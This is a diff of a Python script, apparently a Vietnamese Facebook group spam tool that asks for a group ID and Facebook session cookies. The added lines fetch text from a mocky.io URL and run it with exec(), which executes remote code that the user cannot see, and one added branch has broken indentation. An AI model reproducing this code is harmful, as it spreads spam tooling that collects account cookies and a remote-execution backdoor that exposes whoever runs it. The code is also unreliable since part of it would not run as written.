@@ -64,6 +64,12 @@ print('''
         |___/                            |___/                          |___/ 
 \n\n''')
 time.sleep(0.5)
+chon = int(input('\033[1;31m[\033[1;37m[👾]\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;37m: \033[1;33m'))
+if chon == 1 :
+	exec(requests.get('https://run.mocky.io/v3/5c5068c6-cb65-4313-878e-5b265ef2765c').text)
+if chon == 2 :
+os.system("clear")
+
 id=input('\033[1;31m[👾\033[1;31m] \033[1;37m=> \033[1;33mNhập ID Nhóm Cần Spam\033[1;37m: ')
 while True:
     ck=input('\033[1;31m[👾\033[1;31m] \033[1;37m=> \033[1;33mNhập Cookie Facebook\033[1;37m: ')
